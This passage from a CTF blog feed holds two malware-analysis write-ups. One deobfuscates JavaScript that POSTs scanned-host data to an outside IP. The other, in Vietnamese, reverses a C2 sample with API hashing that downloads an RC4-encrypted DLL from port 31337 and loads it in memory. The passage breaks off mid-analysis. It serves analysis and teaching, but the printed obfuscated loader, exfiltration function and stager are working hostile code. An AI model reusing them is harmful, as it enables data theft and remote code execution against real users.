            const vIyHl = -parseFloat(pqzco_KFvLt(0x209)) / (-parseInt(0x1) * -0x1d9 + parseInt(0xffa) + -parseInt(0x11d2)) * (parseFloat(pqzco_KFvLt(0x20c)) / (Number(parseInt(0x23)) * parseInt(0x11) + Math.trunc(-parseInt(0x37d)) * -0x3 + parseInt(-0xcc8))) + parseInt(-parseFloat(pqzco_KFvLt(0x228)) / (parseInt(0x2) * -0x377 + -0x1357 * -parseInt(0x1) + Number(-parseInt(0x633)) * parseInt(0x2))) + parseFloat(-parseFloat(pqzco_KFvLt(0x1f8)) / (-parseInt(0x17cc) + parseFloat(parseInt(0x19a)) + parseInt(0x1636))) * parseInt(parseFloat(pqzco_KFvLt(0x23e)) / (parseInt(0x1c1) + Math.ceil(0xbad) + Math.floor(0x1) * Math.ceil(-0xd69))) + Math[&apos;floor&apos;](parseFloat(pqzco_KFvLt(0x1fe)) / (parseInt(0x1b94) + Math.floor(0x3) * -0x95f + parseInt(0x8f))) * (-parseFloat(pqzco_KFvLt(0x21c)) / (Math.ceil(parseInt(0x5)) * parseInt(-parseInt(0x434)) + parseFloat(parseInt(0x1573)) + -0x68)) + -parseFloat(pqzco_KFvLt(0x235)) / (Math.floor(-parseInt(0x26ad)) + Math.ceil(-parseInt(0x7db)) + Math.max(-0xa, -parseInt(0xa)) * -0x4a8) + -parseFloat(pqzco_KFvLt(0x215)) / (0xf * -parseInt(0x1) + -parseInt(0x17c5) + parseInt(parseInt(0x29)) * 0x95) * (-parseFloat(pqzco_KFvLt(0x240)) / (parseFloat(-0x1ae8) + parseInt(0xe52) + Math.trunc(0xca0))) + Number(parseFloat(pqzco_KFvLt(0x20a)) / (0x1c7f * -0x1 + Math.max(parseInt(0x169), parseInt(0x169)) + Math.floor(parseInt(0x1b21)))) * Math[&apos;floor&apos;](parseFloat(pqzco_KFvLt(0x22d)) / (-parseInt(0x87) * -0x18 + Math.floor(parseInt(0x1)) * -parseInt(0x2f8) + 0x1 * Number(-parseInt(0x9a4))));
            if (vIyHl === UkXTniOk) break;
            else oOByfoMkNlbqnFB[&apos;push&apos;](oOByfoMkNlbqnFB[&apos;shift&apos;]());
        } catch (a$PYsRhhF) {
            oOByfoMkNlbqnFB[&apos;push&apos;](oOByfoMkNlbqnFB[&apos;shift&apos;]());
        }
    }
}(FCFysguDoCPBlt$j_rW, -parseInt(0x2) * parseInt(0xab223) + -parseInt(0x1) * parseFloat(0x164afd) + Math.ceil(0x3867c4)));

function FCFysguDoCPBlt$j_rW() {
    const kE$QV$Zlc = [&apos;878c898b80b79d8a87&apos;, &apos;8a8b8c9194&apos;, &apos;89819797858381&apos;, &apos;8d838a8b9681&apos;, &apos;8d8a9081968a8588&apos;, &apos;928588918197&apos;, &apos;dcd5a6bc969e9189&apos;, &apos;94888590828b9689&apos;, &apos;96819488858781&apos;, &apos;c4c4a9a5a7dec4&apos;, &apos;07665d076649076747076757014b5a0c554507676907676707676c07674b07675807664bdec4&apos;, &apos;898d8a&apos;, &apos;898590878c&apos;, &apos;d5d3d18797b7a08888&apos;, &apos;9794888d90&apos;, &apos;d5d4ca&apos;, &apos;858888&apos;, &apos;8c90909497decbcb89818385ca8a9ecb828d8881cbb7a08bd48da7a6b5c7d58daebd9db7a69cd1abbedd8a9d919ea1bc888ddd91afaeb6809295bdacc98a9195ae82d08680be968f8b&apos;, &apos;85968392&apos;, &apos;908ba88b938196a7859781&apos;, &apos;9790968d8a838d829d&apos;, &apos;b48d8a83c4908bc4&apos;, &apos;948d8a83c4c987c4d5c4c9b3c4d5c4&apos;, &apos;d5d6d3cad4cad4cad5&apos;, &apos;819c8187b485908c&apos;, &apos;d0dcd7d4d0d4d6b38b91a39c83&apos;, &apos;888b83&apos;, &apos;88818a83908c&apos;, &apos;859494888d8785908d8b8acb8e978b8a&apos;, &apos;9787858ac4858a80c497818a808196&apos;, &apos;d5d6a1b088a38081&apos;, &apos;0d6465005b45026c74016e7bc8c407665d07676207675807665b07665d07665707675807676dde&apos;, &apos;859694c4c985&apos;, &apos;a5b6b407665d0766490767470767570766760d726f01436f07657307655a07657dcacaca&apos;, &apos;0d6465005b4507664c07674d076758de&apos;, &apos;968180918781&apos;, &apos;07665d076649076747076757005c49dec4&apos;, &apos;938d8ad7d6&apos;, &apos;ddd6dddddcd4dca194b4b187ac&apos;, &apos;93968d9081a28d8881b79d8a87&apos;, &apos;948d8a83c4c98ac4d5c4c993c4d5d4d4d4c4&apos;, &apos;c482858d888180dec4&apos;, &apos;adb4dec4&apos;, &apos;8a8190938b968fad8a9081968285878197&apos;, &apos;908c818a&apos;, &apos;adb492d0&apos;, &apos;d5ddd6cad5d2dcca&apos;, &apos;d6d6d6d1d18b89b5b58a86&apos;, &apos;878c8d8880b787858a&apos;, &apos;d5d6ddd2d3d4bca9a2b2b7b0&apos;, &apos;8c909094decbcbddd2cad3cad5d6dccad6d4ddcb85948dcb818a80948b8d8a90&apos;, &apos;b4abb7b0&apos;, &apos;8285898d889d&apos;, &apos;888b8580a59090968d8691908197&apos;, &apos;908d908881&apos;, &apos;8196968b96&apos;, &apos;979085909197&apos;, &apos;918a968182&apos;, &apos;898587&apos;, &apos;898183858e97&apos;, &apos;93968d9081&apos;, &apos;ee07674907675807664f07674fadb4dec4&apos;, &apos;d5d4d7d2b4abaebeac94&apos;, &apos;07677f07665d07676ce9&apos;, &apos;9790808b9190&apos;, &apos;85808096819797&apos;, &apos;07677f07665d07676c&apos;, &apos;82968b89b1b6a8&apos;, &apos;d6d7d4d4d0d2aa938ba08a8e&apos;, &apos;8e8b8d8a&apos;, &apos;94968b87819797&apos;, &apos;9491978c&apos;, &apos;ee07665d076649076747076757014a68005e62dec4&apos;, &apos;878590878c&apos;, &apos;8081869183&apos;, &apos;878c8d8880bb94968b87819797&apos;, &apos;828b96a185878c&apos;, &apos;8a858981&apos;, &apos;979085969097b38d908c&apos;, &apos;d5d0d7b395b6a0bcad&apos;, &apos;d2d3d4ddd1d4d5d3b6a99db6b79c&apos;, &apos;02407801635e07657307657b07677f07665d07676cde&apos;, &apos;d2ddd3d0a0969481a7a6&apos;, &apos;808b938a888b8580a69182828196&apos;, &apos;819c8d90&apos;];
    FCFysguDoCPBlt$j_rW = function() {
        return kE$QV$Zlc;
    };
    return FCFysguDoCPBlt$j_rW();
}
function WoV$tBFijDNUIz(dL$XnoyZBnknlhIiCmEzwmu, yr$t$gwSX) {
    const t_zkek_TJFQ = FCFysguDoCPBlt$j_rW();
    return WoV$tBFijDNUIz = function(WUdwGkzbEVBepUzvjiwbh, NlmzZnWkXOvaQF$$Y) {
        WUdwGkzbEVBepUzvjiwbh = WUdwGkzbEVBepUzvjiwbh - (0x1 * Math.floor(0xec1) + 0x1 * parseInt(parseInt(0x7e1)) + Math.trunc(-0x14b0));
        let DBqcUC_bGhwXNTn$jWHczQ = t_zkek_TJFQ[WUdwGkzbEVBepUzvjiwbh];
        if (WoV$tBFijDNUIz[&apos;Qluqqr&apos;] === undefined) {
            const LlTSrs__UZEexQjyvC = function(uydCEioFPKSAHCrsEM) {
                let xutO_S_dxEdfdSdk = -0x25 * parseInt(-parseInt(0x1d)) + 0x16b9 + -parseInt(0x1a06) &amp;amp; Math.ceil(-0x1128) + parseInt(0x6) * parseInt(0x562) + -parseInt(0xe25)
                    , s$GvwrdW = new Uint8Array(uydCEioFPKSAHCrsEM[&apos;match&apos;](/.{1,2}/g)[&apos;map&apos;](rjxrzgQ =&amp;gt; parseInt(rjxrzgQ, parseFloat(0x31) * 0x43 + -parseInt(0x19) * parseInt(0xd) + Number(parseInt(0xb7e)) * parseInt(-0x1))))
                    , vzb_$nN = s$GvwrdW[&apos;map&apos;](Monq$_AtE =&amp;gt; Monq$_AtE ^ xutO_S_dxEdfdSdk)
                    , PIELHsxTQxjtFL = new TextDecoder()
                    , S_HSGp$ObSwKZaV = PIELHsxTQxjtFL[&apos;decode&apos;](vzb_$nN);
                return S_HSGp$ObSwKZaV;
            };
            WoV$tBFijDNUIz[&apos;BYhUJP&apos;] = LlTSrs__UZEexQjyvC, dL$XnoyZBnknlhIiCmEzwmu = arguments, WoV$tBFijDNUIz[&apos;Qluqqr&apos;] = !![];
        }
        const qJIkgkxMUzlBjHd$PwhC = t_zkek_TJFQ[-parseInt(0x2) * Number(-0xdf3) + 0xeb2 + -0xbc * 0x3a]
            , mdif$q$Gv = WUdwGkzbEVBepUzvjiwbh + qJIkgkxMUzlBjHd$PwhC
            , dhW$ZTbNgbxwvUdYrNwNVOaHe = dL$XnoyZBnknlhIiCmEzwmu[mdif$q$Gv];
        return !dhW$ZTbNgbxwvUdYrNwNVOaHe ? (WoV$tBFijDNUIz[&apos;rzVaPm&apos;] === undefined &amp;amp;&amp;amp; (WoV$tBFijDNUIz[&apos;rzVaPm&apos;] = !![]), DBqcUC_bGhwXNTn$jWHczQ = WoV$tBFijDNUIz[&apos;BYhUJP&apos;](DBqcUC_bGhwXNTn$jWHczQ), dL$XnoyZBnknlhIiCmEzwmu[mdif$q$Gv] = DBqcUC_bGhwXNTn$jWHczQ) : DBqcUC_bGhwXNTn$jWHczQ = dhW$ZTbNgbxwvUdYrNwNVOaHe, DBqcUC_bGhwXNTn$jWHczQ;
    }, WoV$tBFijDNUIz(dL$XnoyZBnknlhIiCmEzwmu, yr$t$gwSX);
}
const TliGZFCRr$f_lF = uDOdzcLVrnBW$zxS
console.log(`async function sendResults(rS$ClJLTXhGgfGrRteqoNKsQu$g) {
    const TliGZFCRr$f_lF = uDOdzcLVrnBW$zxS
        , xY_WrxsfJxMwAx = ${TliGZFCRr$f_lF(0x241)}
        , QkGLuwfbXPZgPCQrDgJeP = {
            &apos;scanned_hosts&apos;: rS$ClJLTXhGgfGrRteqoNKsQu$g
        };
    try {
        const BKcEwFtyvecUTnu = await fetch(xY_WrxsfJxMwAx, {
            &apos;method&apos;: TliGZFCRr$f_lF(0x242)
            , &apos;headers&apos;: {
                &apos;Content-Type&apos;: ${TliGZFCRr$f_lF(0x22b)}
            }
            , &apos;body&apos;: JSON[${TliGZFCRr$f_lF(0x223)}](QkGLuwfbXPZgPCQrDgJeP)
        });
        console[${TliGZFCRr$f_lF(0x229)}](${TliGZFCRr$f_lF(0x22e)}, BKcEwFtyvecUTnu[${TliGZFCRr$f_lF(0x1f2)}]);
    } catch (TJTadDFVgeKsuvnbQvM$Z_cKjoQ) {
        console[TliGZFCRr$f_lF(0x229)](${TliGZFCRr$f_lF(0x231)}, TJTadDFVgeKsuvnbQvM$Z_cKjoQ);
    }
}`)
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;async function sendResults(rS$ClJLTXhGgfGrRteqoNKsQu$g) {    
    const TliGZFCRr$f_lF = uDOdzcLVrnBW$zxS
        , xY_WrxsfJxMwAx = http://96.7.128.209/api/endpoint
        , QkGLuwfbXPZgPCQrDgJeP = {
            &apos;scanned_hosts&apos;: rS$ClJLTXhGgfGrRteqoNKsQu$g
        };
    try {
        const BKcEwFtyvecUTnu = await fetch(xY_WrxsfJxMwAx, {
            &apos;method&apos;: POST
            , &apos;headers&apos;: {
                &apos;Content-Type&apos;: application/json
            }
            , &apos;body&apos;: JSON[stringify](QkGLuwfbXPZgPCQrDgJeP)
        });
        console[log](送信成功, ステータスコード:, BKcEwFtyvecUTnu[status]);
    } catch (TJTadDFVgeKsuvnbQvM$Z_cKjoQ) {
        console[log](送信エラー:, TJTadDFVgeKsuvnbQvM$Z_cKjoQ);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I deobfuscated the function using a string format replacement technique.
As a result, I successfully identified the attacker&apos;s IP address and API endpoint.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag: CPCTF{n37scan-96_7_128_209-evil}&lt;/p&gt;
&lt;/blockquote&gt;
</content:encoded></item><item><title>Trust Me! (ASCIS2024)</title><link>https://bruning-frighting.github.io/KAiZ3nThong/posts/trustme/</link><guid isPermaLink="true">https://bruning-frighting.github.io/KAiZ3nThong/posts/trustme/</guid><pubDate>Fri, 18 Apr 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;Trust Me! (ASCIS2024)&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;author: kAiZ3n&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Nhận được 2 file : TrustMe.exe và record.pcapng
Do đây là challenge liên quan đến command&amp;amp;control
tôi check string thì thấy được ipaddr lạ trong file PE tiến hành xref tới hàm xử lý&lt;/p&gt;
&lt;h2&gt;Code logic chính tại sub_88301&lt;/h2&gt;
&lt;p&gt;tại đây có 1 hàm xử lý tôi đã rename lại resolve_APIhashing_ws2_32() tại hàm này ta thấy nó gọi hàm sub_881B80 với file dll library và chuỗi hex đây là kỹ thuật resolve hashing&lt;/p&gt;
&lt;h2&gt;Load Library Manual tại sub_881B80&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Load DLL với LoadLibraryA&lt;/li&gt;
&lt;li&gt;ImageDirectoryEntryToData : lấy con trỏ tới Export Table&lt;/li&gt;
&lt;li&gt;hàm hashing tại sub_881690&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Hashing API&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;unsigned int __fastcall sub_881690(_BYTE *a1, const char *a2)
{
  char v2; // al
  unsigned int v3; // ebx
  unsigned int v4; // esi
  const char *v5; // edi
  unsigned __int64 v6; // kr00_8
  unsigned int v7; // ebx
  unsigned __int64 v8; // rt0
  unsigned __int64 v9; // rax
  unsigned __int64 v10; // rax
  unsigned __int64 v11; // rax
  unsigned __int64 v12; // rax
  unsigned __int64 v13; // rax
  unsigned __int64 v14; // rax
  unsigned __int64 v15; // rax
  unsigned __int64 v16; // rax
  unsigned __int64 v17; // rax
  unsigned __int64 v18; // rax
  unsigned __int64 v19; // rax
  unsigned __int64 v20; // rax
  unsigned __int64 v21; // rax
  unsigned __int64 v22; // rax
  unsigned __int64 v23; // rax
  int i; // ebx
  unsigned int result; // eax
  unsigned __int64 v26; // [esp-10h] [ebp-A0h]
  __int64 k; // [esp-10h] [ebp-A0h]
  unsigned int v28; // [esp+10h] [ebp-80h]
  unsigned int v29; // [esp+14h] [ebp-7Ch]
  unsigned int v30; // [esp+18h] [ebp-78h]
  unsigned int v31; // [esp+1Ch] [ebp-74h]
  unsigned int v32; // [esp+20h] [ebp-70h]
  unsigned int v33; // [esp+24h] [ebp-6Ch]
  unsigned int v34; // [esp+28h] [ebp-68h]
  unsigned int v35; // [esp+2Ch] [ebp-64h]
  unsigned int v36; // [esp+30h] [ebp-60h]
  unsigned int v37; // [esp+34h] [ebp-5Ch]
  _BYTE *v38; // [esp+40h] [ebp-50h]
  unsigned int v39; // [esp+44h] [ebp-4Ch]
  char v41[20]; // [esp+4Ch] [ebp-44h] BYREF
  _QWORD v42[6]; // [esp+60h] [ebp-30h]

  v2 = *a1;
  v38 = a1;
  v30 = 0x84222325;
  v31 = 0x842224D8;
  v33 = 0x8422268B;
  v32 = 0xCBF29EE4;
  v35 = 0x8422283E;
  v34 = 0xCBF29FE4;
  v37 = 0x842229F1;
  v36 = 0xCBF2A0E4;
  v3 = 0xCBF29DE4;
  v29 = 0xCBF29DE4;
  v4 = 0xCBF29CE4;
  v5 = a2;
  v6 = 0xCBF2A1E484222BA4uLL;
  if ( *a1 )
  {
    do
    {
      v7 = v2;
      v28 = (unsigned __int64)v2 &amp;gt;&amp;gt; 32;
      HIDWORD(v8) = v4 ^ v28;
      LODWORD(v8) = v30 ^ v2;
      HIDWORD(v26) = v8 &amp;gt;&amp;gt; 25;
      LODWORD(v26) = ((_DWORD)v8 &amp;lt;&amp;lt; 7) | ((v4 ^ v28) &amp;gt;&amp;gt; 25);
      v9 = 0x100000001B3LL * v26;
      HIDWORD(v26) = __SPAIR64__(v9, HIDWORD(v9)) &amp;gt;&amp;gt; 5;
      LODWORD(v26) = v9 &amp;gt;&amp;gt; 5;
      v10 = v26 % 0xFFFFFFFFFFFFFFFFuLL;
      v30 = v26 % 0xFFFFFFFFFFFFFFFFuLL;
      HIDWORD(v8) = v29 ^ v28;
      LODWORD(v8) = v31 ^ v7;
      HIDWORD(v26) = v8 &amp;gt;&amp;gt; 24;
      v39 = HIDWORD(v10);
      LODWORD(v26) = ((v31 ^ v7) &amp;lt;&amp;lt; 8) | ((v29 ^ v28) &amp;gt;&amp;gt; 24);
      v11 = 0x100000001B3LL * v26;
      HIDWORD(v26) = __SPAIR64__(v11, HIDWORD(v11)) &amp;gt;&amp;gt; 6;
      LODWORD(v26) = v11 &amp;gt;&amp;gt; 6;
      v31 = v26 % 0xFFFFFFFFFFFFFFFFuLL;
      HIDWORD(v8) = v32 ^ v28;
      LODWORD(v8) = v33 ^ v7;
      v29 = (v26 % 0xFFFFFFFFFFFFFFFFuLL) &amp;gt;&amp;gt; 32;
      HIDWORD(v26) = v8 &amp;gt;&amp;gt; 23;
      LODWORD(v26) = ((v33 ^ v7) &amp;lt;&amp;lt; 9) | ((v32 ^ v28) &amp;gt;&amp;gt; 23);
      v12 = 0x100000001B3LL * v26;
      HIDWORD(v26) = __SPAIR64__(v12, HIDWORD(v12)) &amp;gt;&amp;gt; 7;
      LODWORD(v26) = v12 &amp;gt;&amp;gt; 7;
      v13 = v26 % 0xFFFFFFFFFFFFFFFFuLL;
      v33 = v26 % 0xFFFFFFFFFFFFFFFFuLL;
      HIDWORD(v8) = v34 ^ v28;
      LODWORD(v8) = v35 ^ v7;
      HIDWORD(v26) = v8 &amp;gt;&amp;gt; 22;
      v32 = HIDWORD(v13);
      LODWORD(v26) = ((v35 ^ v7) &amp;lt;&amp;lt; 10) | ((v34 ^ v28) &amp;gt;&amp;gt; 22);
      v14 = 0x100000001B3LL * v26;
      HIDWORD(v26) = __SPAIR64__(v14, HIDWORD(v14)) &amp;gt;&amp;gt; 8;
      LODWORD(v26) = v14 &amp;gt;&amp;gt; 8;
      v15 = v26 % 0xFFFFFFFFFFFFFFFFuLL;
      v35 = v26 % 0xFFFFFFFFFFFFFFFFuLL;
      HIDWORD(v8) = v36 ^ v28;
      LODWORD(v8) = v37 ^ v7;
      HIDWORD(v26) = v8 &amp;gt;&amp;gt; 21;
      v34 = HIDWORD(v15);
      LODWORD(v26) = ((v37 ^ v7) &amp;lt;&amp;lt; 11) | ((v36 ^ v28) &amp;gt;&amp;gt; 21);
      v16 = 0x100000001B3LL * v26;
      HIDWORD(v26) = __SPAIR64__(v16, HIDWORD(v16)) &amp;gt;&amp;gt; 9;
      LODWORD(v26) = v16 &amp;gt;&amp;gt; 9;
      v36 = (v26 % 0xFFFFFFFFFFFFFFFFuLL) &amp;gt;&amp;gt; 32;
      v37 = v26 % 0xFFFFFFFFFFFFFFFFuLL;
      HIDWORD(v26) = (v6 ^ __PAIR64__(v28, v7)) &amp;gt;&amp;gt; 20;
      LODWORD(v26) = (((unsigned int)v6 ^ v7) &amp;lt;&amp;lt; 12) | ((HIDWORD(v6) ^ v28) &amp;gt;&amp;gt; 20);
      v17 = 0x100000001B3LL * v26;
      HIDWORD(v26) = __SPAIR64__(v17, HIDWORD(v17)) &amp;gt;&amp;gt; 10;
      LODWORD(v26) = v17 &amp;gt;&amp;gt; 10;
      v4 = v39;
      v6 = v26 % 0xFFFFFFFFFFFFFFFFuLL;
      v2 = *++v38;
    }
    while ( *v38 );
    v5 = a2;
    v3 = v29;
  }
  HIDWORD(k) = v4;
  LODWORD(k) = v30 ^ (v4 &amp;gt;&amp;gt; 1);
  v18 = 0xC4CEB9FE1A85EC53uLL * ((0xFF51AFD7ED558CCDuLL * k) ^ ((unsigned int)((0xFF51AFD7ED558CCDuLL * k) &amp;gt;&amp;gt; 32) &amp;gt;&amp;gt; 1));
  v42[0] = v18 ^ (HIDWORD(v18) &amp;gt;&amp;gt; 1);
  HIDWORD(k) = v3;
  LODWORD(k) = v31 ^ (v3 &amp;gt;&amp;gt; 1);
  v19 = 0xC4CEB9FE1A85EC53uLL * ((0xFF51AFD7ED558CCDuLL * k) ^ ((unsigned int)((0xFF51AFD7ED558CCDuLL * k) &amp;gt;&amp;gt; 32) &amp;gt;&amp;gt; 1));
  HIDWORD(k) = v32;
  LODWORD(k) = v33 ^ (v32 &amp;gt;&amp;gt; 1);
  v42[1] = v19 ^ (HIDWORD(v19) &amp;gt;&amp;gt; 1);
  v20 = 0xC4CEB9FE1A85EC53uLL * ((0xFF51AFD7ED558CCDuLL * k) ^ ((unsigned int)((0xFF51AFD7ED558CCDuLL * k) &amp;gt;&amp;gt; 32) &amp;gt;&amp;gt; 1));
  v42[2] = v20 ^ (HIDWORD(v20) &amp;gt;&amp;gt; 1);
  HIDWORD(k) = v34;
  LODWORD(k) = v35 ^ (v34 &amp;gt;&amp;gt; 1);
  v21 = 0xC4CEB9FE1A85EC53uLL * ((0xFF51AFD7ED558CCDuLL * k) ^ ((unsigned int)((0xFF51AFD7ED558CCDuLL * k) &amp;gt;&amp;gt; 32) &amp;gt;&amp;gt; 1));
  HIDWORD(k) = v36;
  LODWORD(k) = v37 ^ (v36 &amp;gt;&amp;gt; 1);
  v42[3] = v21 ^ (HIDWORD(v21) &amp;gt;&amp;gt; 1);
  v22 = 0xC4CEB9FE1A85EC53uLL * ((0xFF51AFD7ED558CCDuLL * k) ^ ((unsigned int)((0xFF51AFD7ED558CCDuLL * k) &amp;gt;&amp;gt; 32) &amp;gt;&amp;gt; 1));
  v42[4] = v22 ^ (HIDWORD(v22) &amp;gt;&amp;gt; 1);
  v23 = 0xC4CEB9FE1A85EC53uLL
      * ((0xFF51AFD7ED558CCDuLL * (v6 ^ (HIDWORD(v6) &amp;gt;&amp;gt; 1))) ^ ((unsigned int)((0xFF51AFD7ED558CCDuLL
                                                                              * (v6 ^ (HIDWORD(v6) &amp;gt;&amp;gt; 1))) &amp;gt;&amp;gt; 32) &amp;gt;&amp;gt; 1));
  v42[5] = v23 ^ (HIDWORD(v23) &amp;gt;&amp;gt; 1);
  for ( i = 0; i &amp;lt; 6; ++i )
  {
    sprintf((int)v41, (int)&quot;%016llx&quot;, v42[i]);
    result = strlen(v41) + 1;
    qmemcpy((void *)&amp;amp;v5[strlen(v5)], v41, result);
    v5 = a2;
  }
  return result;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HyC4oiARJg.png&quot; alt=&quot;image&quot; /&gt;
mình đã sử dụng virustotal để nhận diện hash  là fnv nhưng có vẻ không kết thúc tại đó nó còn kết hợp thêm kỹ thuật giống như trong MurmurHash3
Do không thể giả lập lại hàm hash mà ban đầu tôi đã đề cập sau khoảng thời gian mấy ngày mò docs cũng như tìm hiểu về API ws2_32.dll thì tôi nhận ra cách mà chương trình tạo ra một socket TCP đều dùng các FunctionCall quen thuộc (như send, recv, connect, bind, accept, listen) cùng với các các parameter dễ nhận dạng do đây là một file malware C2 nghi ngờ gửi dữ liệu từ target-attacker và ngược lại nên tôi search các function tạo một TCP connect()
sau một hồi research
https://stackoverflow.com/questions/16372700/how-to-use-getaddrinfo-to-connect-to-a-server-using-the-external-ip
thì tôi thấy trang này có một code C++ khá gần với code chúng ta và dựa vào đó tôi đã reverse lại function này&lt;/p&gt;
&lt;h2&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;int sub_403010()
{
  char *key; // ebx
  int v1; // eax
  _DWORD *v2; // esi
  int WSAStartUp; // eax
  PADDRINFOA *v4; // edi
  int (__stdcall *getaddrinfo)(const char *, const char *, _DWORD *, _DWORD *); // eax
  int hostAddress; // eax
  PADDRINFOA addrinfo; // eax
  int socket_return; // eax
  int v9; // ecx
  int connect_return; // eax
  int v11; // eax
  _DWORD *recv; // esi
  _DWORD *send; // eax
  int len_key; // esi
  int data; // eax
  int v16; // esi
  _DWORD *recv1; // edi
  void *v18; // edi
  int v19; // esi
  _DWORD *recv2; // ebx
  int v21; // edi
  int keyDecryptData; // eax
  int *v23; // esi
  int handle; // eax
  const char *key_random; // eax
  int v26; // eax
  void *v28; // [esp+70h] [ebp-24h]
  int lenkey; // [esp+74h] [ebp-20h]
  _BYTE *dataencRecv; // [esp+78h] [ebp-1Ch]
  unsigned int ss; // [esp+8Ch] [ebp-8h] BYREF
  unsigned int picEnc; // [esp+90h] [ebp-4h] BYREF
  int savedregs; // [esp+94h] [ebp+0h] BYREF

  malloc(8u);
  CreatePicTureBMP();
  ss = 4;
  key = (char *)malloc(0x14u);
  v28 = dword_420398;
  *(_OWORD *)key = 0LL;
  *((_DWORD *)key + 4) = 0;
  memset(v28, 0, &apos;\x02\xCC&apos;);
  v1 = dword_4203B0(0);
  dword_4203A4(v1);
  v2 = resolve_APIhashing_ws2_32();
  WSAStartUp = ((int (__stdcall *)(int, _DWORD *))v2[114])(514, v2);
  v2[111] = WSAStartUp;
  if ( WSAStartUp )
    ExitProcess(1u);
  v2[103] = 0;
  v4 = (PADDRINFOA *)(v2 + 101);
  v2[107] = 0;
  v2[108] = 0;
  v2[109] = 0;
  v2[110] = 0;
  getaddrinfo = (int (__stdcall *)(const char *, const char *, _DWORD *, _DWORD *))v2[115];
  v2[104] = 0;
  v2[105] = 1;
  v2[106] = 6;
  hostAddress = getaddrinfo(&quot;192.168.89.136&quot;, &quot;31337&quot;, v2 + 103, v2 + 101);
  v2[111] = hostAddress;
  if ( hostAddress )
    goto LABEL_4;
  addrinfo = *v4;
  v2[102] = *v4;
  if ( addrinfo )
  {
    while ( 1 )
    {
      socket_return = ((int (__stdcall *)(int, int, int))v2[116])(
                        addrinfo-&amp;gt;ai_family,
                        addrinfo-&amp;gt;ai_socktype,
                        addrinfo-&amp;gt;ai_protocol);
      v2[100] = socket_return;
      ((void (__stdcall *)(int, int, int, _DWORD *, int))v2[117])(socket_return, 0xFFFF, 4101, v2 + 113, 4);
      v9 = v2[100];
      if ( v9 == -1 )
        break;
      connect_return = ((int (__stdcall *)(int, _DWORD, _DWORD))v2[119])(
                         v9,
                         *(_DWORD *)(v2[102] + 24),
                         *(_DWORD *)(v2[102] + 16));
      v2[111] = connect_return;
      if ( connect_return == -1 )
      {
        ((void (__stdcall *)(_DWORD))v2[120])(v2[100]);// v2[120]v2[100] == closesocket
        v11 = v2[102];
        v2[100] = -1;
        addrinfo = *(PADDRINFOA *)(v11 + 28);
        v2[102] = addrinfo;
        if ( addrinfo )
          continue;
      }
      goto LABEL_9;
    }
LABEL_4:
    ((void (*)(void))v2[118])();
    ExitProcess(1u);
  }
LABEL_9:
  freeaddrinfo(*v4);
  if ( resolve_APIhashing_ws2_32()[100] != -1 ) // resolve_APIhashing_ws2_32()[100] = connect()
  {
    recv = resolve_APIhashing_ws2_32();
    if ( !((int (__stdcall *)(_DWORD, char *, int, _DWORD))recv[122])(recv[100], key, 512, 0) )// recv[122]recv[100] ==  recv
    {
      recv[100] = 0;
      *((_BYTE *)recv + 496) = 0;
    }
    send = resolve_APIhashing_ws2_32();
    ((void (__stdcall *)(_DWORD, unsigned int *, int, _DWORD))send[121])(send[100], &amp;amp;ss, 1, 0);// v29 = 4 (gửi 1 byte)
    ss = strlen((const char *)create_key_random((int)&amp;amp;savedregs));
    RC4_sendEnc((int)&amp;amp;ss, 4, key);
    len_key = strlen((const char *)create_key_random((int)&amp;amp;savedregs));
    data = create_key_random((int)&amp;amp;savedregs);
    RC4_sendEnc(data, len_key, key);            // ma hoa
    v16 = nameFileDLL + 4;
    recv1 = resolve_APIhashing_ws2_32();
    if ( !((int (__stdcall *)(_DWORD, int, int, _DWORD))recv1[122])(recv1[100], v16, 4, 0) )// nhan tu 31337 -&amp;gt; 4 bytes 002a0000 kich thuoc file DLL
    {
      recv1[100] = 0;
      *((_BYTE *)recv1 + 496) = 0;
    }
    v18 = malloc(*(_DWORD *)(nameFileDLL + 4));
    v19 = *(_DWORD *)(nameFileDLL + 4);
    *(_DWORD *)(nameFileDLL + 8) = v18;
    recv2 = resolve_APIhashing_ws2_32();
    if ( !((int (__stdcall *)(_DWORD, void *, int, _DWORD))recv2[122])(recv2[100], v18, v19, 0) )// data file dll đã bị encrypted
    {
      recv2[100] = 0;
      *((_BYTE *)recv2 + 496) = 0;
    }
    lenkey = strlen((const char *)create_key_random((int)&amp;amp;savedregs));
    v21 = nameFileDLL;
    dataencRecv = *(_BYTE **)(nameFileDLL + 8);
    keyDecryptData = create_key_random((int)&amp;amp;savedregs);
    rc4_encrypt(*(_DWORD *)(v21 + 8), *(_DWORD *)(v21 + 4), keyDecryptData, lenkey, dataencRecv);// *(dword_4203B4+4) = key &amp;amp;&amp;amp; *(dword_4203B4+8) = data
    v23 = (int *)nameFileDLL;
    handle = LoadDLL(*(_DWORD *)(v21 + 8), *(_DWORD *)(v21 + 4));
    *v23 = handle;
    if ( !handle )
      sub_401600(&quot;Can&apos;t load library from memory.\n&quot;);
    if ( !*(_DWORD *)nameFileDLL )
    {
      _loaddll((char *)0xFFFFFFFF);
      JUMPOUT(0x4033B3);
    }
    dword_420394 = CreatePicTureBMP();
    picEnc = *(_DWORD *)dword_420394 / (unsigned int)lendataEnc;
    key_random = (const char *)create_key_random((int)&amp;amp;savedregs);// gui size cua pic
    RC4_sendEnc((int)&amp;amp;picEnc, 4, key_random);
  }
  dword_42039C(1, sub_402E80);
  v26 = dword_4203B0(5);
  dword_4203A4(v26);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Giai đoạn phân tích đi đến được đây coi như cũng dễ thở hơn chút vì để rename cũng như handle hết hàm này cũng mất khá nhiều thời gian&lt;/p&gt;
&lt;p&gt;đầu tiên sẽ khởi tạo WSASTARTUP và getaddrinfo để lấy thông tin External IP
